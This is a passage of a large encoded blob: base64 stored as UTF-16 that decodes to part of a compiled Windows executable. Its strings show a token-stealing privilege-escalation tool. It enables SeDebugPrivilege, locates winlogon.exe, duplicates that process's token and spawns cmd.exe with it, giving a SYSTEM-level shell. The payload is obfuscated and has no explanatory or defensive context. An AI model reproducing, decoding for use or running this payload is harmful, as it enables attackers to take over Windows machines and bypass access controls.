GwAQQBnAFkAQQBBAFAAOABsAHYAQQBVAEEAQQBQADgAbABIAGcAWQBBAEEAUAA4AGwAbQBBAFUAQQBBAFAAOABsAG8AZwBVAEEAQQBQADgAbABsAEEAVQBBAEEAUAA4AGwAZgBnAFUAQQBBAFAAOABsAGMAQQBVAEEAQQBQADgAbABJAGcAVQBBAEEAUAA4AGwAQgBBAFUAQQBBAFAAOABsADUAZwBVAEEAQQBQADgAbABBAEEAVQBBAEEAUAA4AGwASwBnAFUAQQBBAFAAOABsAEwAQQBVAEEAQQBQADgAbABMAGcAVQBBAEEAUAA4AGwATQBBAFUAQQBBAFAAOABsAEkAZwBRAEEAQQBNAHoATQBTAEkAUABzAEsARQAyAEwAUQBUAGgASQBpADgAcABKAGkAOQBIAG8ARABRAEEAQQBBAEwAZwBCAEEAQQBBAEEAUwBJAFAARQBLAE0AUABNAHoATQB4AEEAVQAwAFcATABHAEUAaQBMADIAawBHAEQANAAvAGgATQBpADgAbABCADkAZwBBAEUAVABJAHYAUgBkAEIATgBCAGkAMABBAEkAVABXAE4AUQBCAFAAZgBZAFQAQQBQAFIAUwBHAFAASQBUAEMAUABSAFMAVwBQAEQAUwBvAHMAVQBFAEUAaQBMAFEAeABDAEwAUwBBAGgASQBpADAATQBJADkAawBRAEIAQQB3ADkAMABDAHcAKwAyAFIAQQBFAEQAZwArAEQAdwBUAEEAUABJAFQARABQAEsAUwBZAHYASgBXACsAbgA5ADgAUAAvAC8AegBFAGkATAB4AEUAaQBKAFcAQQBoAEkAaQBXAGcAUQBTAEkAbAB3AEcARQBpAEoAZQBDAEIAQgBWAGsAaQBEADcAQwBCAEoAaQAxAGsANABTAEkAdgB5AFQAWQB2AHcAUwBJAHYAcABTAFkAdgBSAFMASQB2AE8AUwBZAHYANQBUAEkAMQBEAEIATwBoAHMALwAvAC8ALwBpADAAVQBFAEoARwBiADIAMgBMAGcAQgBBAEEAQQBBAFIAUgB2AEEAUQBmAGYAWQBSAEEAUABBAFIASQBWAEQAQgBIAFEAUgBUAEkAdgBQAFQAWQB2AEcAUwBJAHYAVwBTAEkAdgBOADYARgBqACsALwAvADkASQBpADEAdwBrAE0ARQBpAEwAYgBDAFEANABTAEkAdAAwAEoARQBCAEkAaQAzAHcAawBTAEUAaQBEAHgAQwBCAEIAWABzAFAALwBKAGEAOABEAEEAQQBEAC8ASgBhAEUARABBAEEARABNAHoATQB6AE0AegBNAHoATQBaAG0AWQBQAEgANABRAEEAQQBBAEEAQQBBAFAALwBnAHoATQB6AE0AegBNAHoATQB6AE0AegBNAHoATQB6AE0AegBNAHgASQBqAFkAbwB3AEEAQQBBAEEANgBTAFQAcgAvAC8AOQBJAGoAWQBvAG8AQQBBAEEAQQA2AGIAagB2AC8ALwAvAE0AegBNAHoATQB6AE0AegBNAHoARQBpAE4AaQBuAEEAQQBBAEEARABwAEIATwB2AC8ALwAwAEIAVgBTAEkAUABzAEkARQBpAEwANgBrAGkATABBAFUAaQBMADAAWQBzAEkANgBQADcAOQAvAC8AKwBRAFMASQBQAEUASQBGADMARAB6AEUAQgBWAFMASQB2AHEAUwBJAHMAQgBNADgAbQBCAE8AQQBVAEEAQQBNAEEAUABsAE0ARwBMAHcAVgAzAEQAegBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEATwBrAFkAQQBBAEEAQQBBAEEAQQBBAGkAUgBnAEEAQQBBAEEAQQBBAEEAQgBKAEcAQQBBAEEAQQBBAEEAQQBBACsARQBVAEEAQQBBAEEAQQBBAEEARABlAFIAUQBBAEEAQQBBAEEAQQBBAE0AcABGAEEAQQBBAEEAQQBBAEEAQQB1AGsAVQBBAEEAQQBBAEEAQQBBAEMAbQBSAFEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAaQBrAFUAQQBBAEEAQQBBAEEAQQBCADQAUgBRAEEAQQBBAEEAQQBBAEEARwBaAEYAQQBBAEEAQQBBAEEAQQBBAFYAawBVAEEAQQBBAEEAQQBBAEEAQQA2AFIAUQBBAEEAQQBBAEEAQQBBAEMAeABGAEEAQQBBAEEAQQBBAEEAQQBHAEUAVQBBAEEAQQBBAEEAQQBBAEQAOABTAFEAQQBBAEEAQQBBAEEAQQBCAFoASwBBAEEAQQBBAEEAQQBBAEEASwBrAG8AQQBBAEEAQQBBAEEAQQBCAEcAUwBnAEEAQQBBAEEAQQBBAEEARwBSAEsAQQBBAEEAQQBBAEEAQQBBAGUARQBvAEEAQQBBAEEAQQBBAEEARABvAFMAUQBBAEEAQQBBAEEAQQBBAEoAUgBLAEEAQQBBAEEAQQBBAEEAQQByAGsAbwBBAEEAQQBBAEEAQQBBAEQARQBTAGcAQQBBAEEAQQBBAEEAQQBOAHAASwBBAEEAQQBBAEEAQQBBAEEAOQBFAG8AQQBBAEEAQQBBAEEAQQBBAGUAUwB3AEEAQQBBAEEAQQBBAEEAQQBwAEwAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQgBnAFIAZwBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQAxAGsAWQBBAEEAQQBBAEEAQQBBAEEARwBSAHcAQQBBAEEAQQBBAEEAQQBKAEIARwBBAEEAQQBBAEEAQQBBAEEAOABFAFkAQQBBAEEAQQBBAEEAQQBDAG0AUgBnAEEAQQBBAEEAQQBBAEEARAB4AEwAQQBBAEEAQQBBAEEAQQBBAE0AawBzAEEAQQBBAEEAQQBBAEEAQwArAFIAZwBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBnAEUAYwBBAEEAQQBBAEEAQQBBAEIAMABSAHcAQQBBAEEAQQBBAEEAQQBNAHAASQBBAEEAQQBBAEEAQQBBAEEANgBrAGcAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEATABSAEkAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQwBzAFIAdwBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQA4AGsAZwBBAEEAQQBBAEEAQQBBAEEATwBTAFEAQQBBAEEAQQBBAEEAQQBDAHAASgBBAEEAQQBBAEEAQQBBAEEATwBFAGsAQQBBAEEAQQBBAEEAQQBCAE8AUgB3AEEAQQBBAEEAQQBBAEEASQBaAEkAQQBBAEEAQQBBAEEAQQBBAGYARQBnAEEAQQBBAEEAQQBBAEEAQgBXAFMAQQBBAEEAQQBBAEEAQQBBAEgASgBJAEEAQQBBAEEAQQBBAEEAQQBaAEUAZwBBAEEAQQBBAEEAQQBBAEIAQQBTAEEAQQBBAEEAQQBBAEEAQQBDAHAASQBBAEEAQQBBAEEAQQBBAEEASABrAGcAQQBBAEEAQQBBAEEAQQBEADgAUgB3AEEAQQBBAEEAQQBBAEEATgBwAEgAQQBBAEEAQQBBAEEAQQBBAHcARQBjAEEAQQBBAEEAQQBBAEEAQwBjAFIAdwBBAEEAQQBBAEEAQQBBAEkAcABIAEEAQQBBAEEAQQBBAEEAQQBPAEUAZwBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBEAFIASABBAEEAQQBBAEEAQQBBAEEASQBrAGMAQQBBAEEAQQBBAEEAQQBEAGEAUwBBAEEAQQBBAEEAQQBBAEEARQBoAEkAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQgBVAEoAdwBCAEEAQQBRAEEAQQBBAEsAQQB0AEEARQBBAEIAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAdwBIAHcAQgBBAEEAUQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBCAG8ASABnAEIAQQBBAFEAQQBBAEEAQwBBAGYAQQBFAEEAQgBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEANABGAEEAQQBRAEEARQBBAEEAQQBDAEEAVQBRAEIAQQBBAFEAQQBBAEEASQBnADUAQQBFAEEAQgBBAEEAQQBBAFcAQwBNAEEAUQBBAEUAQQBBAEEARABjAEkAdwBCAEEAQQBRAEEAQQBBAEYAVgB1AGEAMgA1AHYAZAAyADQAZwBaAFgAaABqAFoAWABCADAAYQBXADkAdQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEANgBBAEUAQQBCAEEAQQBBAEEAVwBDAE0AQQBRAEEARQBBAEEAQQBEAGMASQB3AEIAQQBBAFEAQQBBAEEARwBKAGgAWgBDAEIAaABiAEcAeAB2AFkAMgBGADAAYQBXADkAdQBBAEEAQwBBAE8AZwBCAEEAQQBRAEEAQQBBAEYAZwBqAEEARQBBAEIAQQBBAEEAQQAzAEMATQBBAFEAQQBFAEEAQQBBAEIAaQBZAFcAUQBnAFkAWABKAHkAWQBYAGsAZwBiAG0AVgAzAEkARwB4AGwAYgBtAGQAMABhAEEAQQBBAEEAQQBBAEkATwB3AEIAQQBBAFEAQQBBAEEAQQBnAHEAQQBFAEEAQgBBAEEAQQBBAFcAeQAxAGQASQBFAHgAdgBiADIAdAAxAGMARgBCAHkAYQBYAFoAcABiAEcAVgBuAFoAVgBaAGgAYgBIAFYAbABJAEcAVgB5AGMAbQA5AHkATwBpAEEAbABkAFEAbwBBAEEAQQBBAEEAQQBGAHMAdABYAFMAQgBCAFoARwBwADEAYwAzAFIAVQBiADIAdABsAGIAbABCAHkAYQBYAFoAcABiAEcAVgBuAFoAWABNAGcAWgBYAEoAeQBiADMASQA2AEkAQwBWADEAQwBnAEEAQQBBAEEAQgBiAEwAVgAwAGcAVgBHAGgAbABJAEgAUgB2AGEAMgBWAHUASQBHAFIAdgBaAFgATQBnAGIAbQA5ADAASQBHAGgAaABkAG0AVQBnAGQARwBoAGwASQBIAE4AdwBaAFcATgBwAFoAbQBsAGwAWgBDAEIAdwBjAG0AbAAyAGEAVwB4AGwAWgAyAFUAdQBJAEEAbwBBAEEARgBzAHIAWABTAEIARABkAFgASgB5AFoAVwA1ADAASQBIAFYAegBaAFgASQBnAGEAWABNADYASQBDAFYAegBDAGcAQQBBAEEAQQBBAEEAQQBBAEEAQQBkAHcAQgBwAEEARwA0AEEAYgBBAEIAdgBBAEcAYwBBAGIAdwBCAHUAQQBDADQAQQBaAFEAQgA0AEEARwBVAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBCAGIASQBWADAAZwBVADIAVgBoAGMAbQBOAG8AYQBXADUAbgBJAEcAWgB2AGMAaQBCAFgAYQBXADUATQBiADIAZAB2AGIAaQBCAFEAUwBVAFEAaABDAGcAQQBBAEEAQQBBAEEAQQBBAEEAQQBXAHkARgBkAEkARQBaAHYAZABXADUAawBJAEYAZABwAGIAbQB4AHYAWgAyADkAdQBJAEYAQgB5AGIAMgBOAGwAYwAzAE0AZwBTAFUAUQA2AEkAQwBWAHMAWgBBAG8AQQBBAEEAQQBBAEEARgBNAEEAWgBRAEIARQBBAEcAVQBBAFkAZwBCADEAQQBHAGMAQQBVAEEAQgB5AEEARwBrAEEAZABnAEIAcABBAEcAdwBBAFoAUQBCAG4AQQBHAFUAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEIAYgBLADEAMABnAFUAMgBWAEUAWgBXAEoAMQBaADEAQgB5AGEAWABaAHAAYgBHAFYAbgBaAFMAQgBsAGIAbQBGAGkAYgBHAFYAawBJAFEAbwBBAEEARgBzAHIAWABTAEIAUABjAEcAVgB1AFUASABKAHYAWQAyAFYAegBjAHkAZwBwAEkASABOADEAWQAyAE4AbABjADMATQBoAEMAZwBBAEEAQQBBAEEAQQBXAHkAMQBkAEkARQA5AHcAWgBXADUAUQBjAG0AOQBqAFoAWABOAHoASwBDAGsAZwBVAG0AVgAwAGQAWABKAHUASQBFAE4AdgBaAEcAVQA2AEkAQwBWAHAAQwBnAEEAQQBBAEEAQQBBAEEARgBzAHQAWABTAEIAUABjAEcAVgB1AFUASABKAHYAWQAyAFYAegBjAHkAZwBwAEkARQBWAHkAYwBtADkAeQBPAGkAQQBsAGEAUQBvAEEAQQBBAEEAQQBXAHkAdABkAEkARQA5AHcAWgBXADUAUQBjAG0AOQBqAFoAWABOAHoAVgBHADkAcgBaAFcANABvAEsAUwBCAHoAZABXAE4AagBaAFgATgB6AEkAUQBvAEEAQQBBAEEAQQBBAEEAQQBBAEEARgBzAHQAWABTAEIAUABjAEcAVgB1AFUASABKAHYAWQAyAFYAegBjADEAUgB2AGEAMgBWAHUASwBDAGsAZwBVAG0AVgAwAGQAWABKAHUASQBFAE4AdgBaAEcAVQA2AEkAQwBWAHAAQwBnAEIAYgBMAFYAMABnAFQAMwBCAGwAYgBsAEIAeQBiADIATgBsAGMAMwBOAFUAYgAyAHQAbABiAGkAZwBwAEkARQBWAHkAYwBtADkAeQBPAGkAQQBsAGEAUQBvAEEAQQBBAEEAQQBBAEEAQQBBAFcAeQB0AGQASQBFAGwAdABjAEcAVgB5AGMAMgA5AHUAWQBYAFIAbABaAEUAeAB2AFoAMgBkAGwAWgBFADkAdQBWAFgATgBsAGMAaQBnAHAASQBIAE4AMQBZADIATgBsAGMAMwBNAGgAQwBnAEEAQQBBAEEAQQBBAEEAQQBBAEEAVwB5AHQAZABJAEYASgBsAGQAbQBWAHkAZABHAGwAdQBaAHkAQgAwAGEASABKAGwAWQBXAFEAZwBkAEcAOABnAGIAMwBKAHAAWgAyAGwAdQBZAFcAdwBnAGQAWABOAGwAYwBpAEIAagBiADIANQAwAFoAWABoADAAQwBnAEEAQQBXAHkAMQBkAEkARQBsAHQAYwBHAFYAeQBjADIAOQB1AFkAWABSAGwAWgBFAHgAdgBaADIAZABsAFoARQA5AHUAVgBYAE4AbABjAGkAZwBwAEkARgBKAGwAZABIAFYAeQBiAGkAQgBEAGIAMgBSAGwATwBpAEEAbABhAFEAbwBBAFcAeQAxAGQASQBFAGwAdABjAEcAVgB5AGMAMgA5AHUAWQBYAFIAbABaAEUAeAB2AFoAMgBkAGwAWgBFADkAdQBWAFgATgBsAGMAaQBnAHAASQBFAFYAeQBjAG0AOQB5AE8AaQBBAGwAYQBRAG8AQQBBAEEAQQBBAEEAQQBBAEEAVwB5AHQAZABJAEUAUgAxAGMARwB4AHAAWQAyAEYAMABaAFYAUgB2AGEAMgBWAHUAUgBYAGcAbwBLAFMAQgB6AGQAVwBOAGoAWgBYAE4AegBJAFEAbwBBAEEAQQBBAEEAQQBBAEEAQQBBAEYAcwB0AFgAUwBCAEUAZABYAEIAcwBhAFcATgBoAGQARwBWAFUAYgAyAHQAbABiAGsAVgA0AEsAQwBrAGcAVQBtAFYAMABkAFgASgB1AEkARQBOAHYAWgBHAFUANgBJAEMAVgBwAEMAZwBCAGIATABWADAAZwBSAEgAVgB3AGEAVwBOAGgAZABHAFYAVQBiADIAdABsAGIAawBWADQASwBDAGsAZwBSAFgASgB5AGIAMwBJADYASQBDAFYAcABDAGcAQQBBAEEAQQBBAEEAQQBBAEEAQQBRAHcAQQA2AEEARgB3AEEAVgB3AEIAcABBAEcANABBAFoAQQBCAHYAQQBIAGMAQQBjAHcAQgBjAEEARgBNAEEAZQBRAEIAegBBAEgAUQBBAFoAUQBCAHQAQQBEAE0AQQBNAGcAQgBjAEEARwBNAEEAYgBRAEIAawBBAEMANABBAFoAUQBCADQAQQBHAFUAQQBBAEEAQgBiAEsAMQAwAGcAVQBIAEoAdgBZADIAVgB6AGMAeQBCAHoAYwBHAEYAMwBiAG0AVgBrAEkAUQBvAEEAQQBBAEIAYgBMAFYAMABnAFEAMwBKAGwAWQBYAFIAbABVAEgASgB2AFkAMgBWAHoAYwAxAGQAcABkAEcAaABVAGIAMgB0AGwAYgBsAGMAZwBVAG0AVgAwAGQAWABKAHUASQBFAE4AdgBaAEcAVQA2AEkAQwBWAHAAQwBnAEEAQQBBAEEAQgBiAEwAVgAwAGcAUQAzAEoAbABZAFgAUgBsAFUASABKAHYAWQAyAFYAegBjADEAZABwAGQARwBoAFUAYgAyAHQAbABiAGwAYwBnAFIAWABKAHkAYgAzAEkANgBJAEMAVgBwAEMAZwBBAEEAYwAzAFIAeQBhAFcANQBuAEkASABSAHYAYgB5AEIAcwBiADIANQBuAEEAQwBJAEYAawB4AGsAQgBBAEEAQQBBAFgARAA4AEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQB3AEEAQQBBAEcAZwAvAEEAQQBCAFEAQQBBAEEAQQBBAEEAQQBBAEEAQQBFAEEAQQBBAEEAaQBCAFoATQBaAEEAZwBBAEEAQQBPAHcAKwBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAUQBBAEEAQQBBAEEAUAB3AEEAQQBJAEEAQQBBAEEAQQBBAEEAQQBBAEEAQgBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAYwBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQB6AFQAZwBGADQAQQBBAEEAQQBBAEEAZwBBAEEAQQBHAEEAQQBBAEEAQgA4AE8AdwBBAEEAZgBDADgAQQBBAEEAQQBBAEEAQQBBAE0AMAA0AEIAZQBBAEEAQQBBAEEAQQB3AEEAQQBBAEEAVQBBAEEAQQBBADMARABzAEEAQQBOAHcAdgBBAEEAQQBBAEEAQQBBAEEARABOAE8AQQBYAGcAQQBBAEEAQQBBAE4AQQBBAEEAQQBwAEEASQBBAEEAUABBADcAQQBBAEQAdwBMAHcAQQBBAEEAQQBBAEEAQQBBAHoAVABnAEYANABBAEEAQQBBAEEARABnAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBnAEIAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBJAFUAQQBCAEEAQQBRAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEIAZwBNAGcAQgBBAEEAUQBBAEEAQQBHAGcAeQBBAEUAQQBCAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEIAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEUAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEcAQgBRAEEAQQBDAHcATwBRAEEAQQBpAEQAawBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEARQBBAEEAQQBEAEkATwBRAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEQAWQBPAFEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAWQBGAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQAvAC8ALwAvAC8AdwBBAEEAQQBBAEIAQQBBAEEAQQBBAHMARABrAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEARQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEARABoAFEAQQBBAEEAbwBPAGcAQQBBAEEARABvAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBJAEEAQQBBAEIAQQBPAGcAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQgBZAE8AZwBBAEEAMgBEAGsAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEANABVAEEAQQBBAEEAUQBBAEEAQQBBAEEAQQBBAEEARAAvAC8ALwAvAC8AQQBBAEEAQQBBAEUAQQBBAEEAQQBBAG8ATwBnAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAUQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAaQBGAEEAQQBBAEsAZwA2AEEAQQBDAEEATwBnAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQB3AEEAQQBBAE0AQQA2AEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEATwBBADYAQQBBAEIAWQBPAGcAQQBBADIARABrAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBpAEYAQQBBAEEAQQBJAEEAQQBBAEEAQQBBAEEAQQBBAC8ALwAvAC8ALwB3AEEAQQBBAEEAQgBBAEEAQQBBAEEAcQBEAG8AQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBFAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBMAGgAUQBBAEEAQQB3AE8AdwBBAEEAQwBEAHMAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEUAQQBBAEEAQgBJAE8AdwBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBCAFkATwB3AEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAHUARgBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEALwAvAC8ALwAvAHcAQQBBAEEAQQBCAEEAQQBBAEEAQQBNAEQAcwBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAFUAbABOAEUAVQAvAHkAcQBvAHEAZQBNAEkAWgA1AEUAbwA1ADIAbwBIAFAAaABkAEoAegBvAEIAQQBBAEEAQQBRAHoAcABjAFYAWABOAGwAYwBuAE4AYwBZAFcAUgB0AGEAVwA1AGMAYwAyADkAMQBjAG0ATgBsAFgASABKAGwAYwBHADkAegBYAEYAQgB5AGIAMgBOAGwAYwAzAE4ASQBZAFcANQBrAGIARwBWAGMAZQBEAFkAMABYAEYASgBsAGIARwBWAGgAYwAyAFYAYwBVAEgASgB2AFkAMgBWAHoAYwAwAGgAaABiAG0AUgBzAFoAUwA1AHcAWgBHAEkAQQBBAEEAQQBBAEEAQwBNAEEAQQBBAEEAagBBAEEAQQBBAEEAUQBBAEEAQQBDAEkAQQBBAEEAQgBIAFEAMQBSAE0AQQBCAEEAQQBBAEoAQQBkAEEAQQBBAHUAZABHAFYANABkAEMAUgB0AGIAZwBBAEEAQQBBAEMAUQBMAFEAQQBBAEkAQQBBAEEAQQBDADUAMABaAFgAaAAwAEoARwAxAHUASgBEAEEAdwBBAEwAQQB0AEEAQQBCAGkAQQBBAEEAQQBMAG4AUgBsAGUASABRAGsAZQBBAEEAQQBNAEEAQQBBAFkAQQBJAEEAQQBDADUAcABaAEcARgAwAFkAUwBRADEAQQBBAEEAQQBBAEcAQQB5AEEAQQBBAFEAQQBBAEEAQQBMAGoAQQB3AFkAMgBaAG4AQQBBAEIAdwBNAGcAQQBBAEMAQQBBAEEAQQBDADUARABVAGwAUQBrAFcARQBOAEIAQQBBAEEAQQBBAEgAZwB5AEEAQQBBAEkAQQBBAEEAQQBMAGsATgBTAFYAQwBSAFkAUQAwAEYAQgBBAEEAQQBBAGcARABJAEEAQQBBAGcAQQBBAEEAQQB1AFEAMQBKAFUASgBGAGgARABXAGcAQQBBAEEAQQBDAEkATQBnAEEAQQBDAEEAQQBBAEEAQwA1AEQAVQBsAFEAawBXAEUAbABCAEEAQQBBAEEAQQBKAEEAeQBBAEEAQQBJAEEAQQBBAEEATABrAE4AUwBWAEMAUgBZAFMAVQBGAEIAQQBBAEEAQQBtAEQASQBBAEEAQQBnAEEAQQBBAEEAdQBRADEASgBVAEoARgBoAEoAUQBVAE0AQQBBAEEAQwBnAE0AZwBBAEEAQwBBAEEAQQBBAEMANQBEAFUAbABRAGsAVwBFAGwAYQBBAEEAQQBBAEEASwBnAHkAQQBBAEEASQBBAEEAQQBBAEwAawBOAFMAVgBDAFIAWQBVAEUARQBBAEEAQQBBAEEAcwBEAEkAQQBBAEEAZwBBAEEAQQBBAHUAUQAxAEoAVQBKAEYAaABRAFcAZwBBAEEAQQBBAEMANABNAGcAQQBBAEMAQQBBAEEAQQBDADUARABVAGwAUQBrAFcARgBSAEIAQQBBAEEAQQBBAE0AQQB5AEEAQQBBAFEAQQBBAEEAQQBMAGsATgBTAFYAQwBSAFkAVgBGAG8AQQBBAEEAQQBBADAARABJAEEAQQBM